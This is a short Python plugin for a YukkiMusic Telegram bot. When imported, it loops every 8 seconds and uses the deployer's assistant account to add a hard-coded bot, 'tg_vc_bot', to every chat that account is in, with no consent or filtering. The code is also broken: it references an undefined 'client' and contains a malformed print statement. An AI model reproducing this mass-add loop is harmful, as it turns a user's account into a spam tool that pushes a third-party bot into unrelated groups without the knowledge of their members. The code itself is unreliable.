import asyncio
import datetime
from YukkiMusic.utils.database import get_assistant
import config
from YukkiMusic import app

AUTO_GCAST = True
BOT_USERNAME = "tg_vc_bot"
ADD_INTERVAL = 8


async def add_bot_to_chats():
    try:
        userbot = await get_assistant(config.LOG_GROUP_ID)
        bot = await client.get_users(BOT_USERNAME)
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == config.LOG_GROUP_ID:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, bot.id)
                print(f"Added bot to chat: {dialog.chat.title}")
            except Exception as e:
                print(f"Failed to add bot to chat: {dialog.chat.title}"\nException {e})

            await asyncio.sleep(1)
    except Exception as e:
        print("Error:", e)


async def continuous_addss():
    while True:
        if AUTO_GCAST:
            await add_bot_to_chats()

        await asyncio.sleep(ADD_INTERVAL)

AUTO_GCAST is True
if AUTO_GCAST:
    asyncio.create_task(continuous_addss())
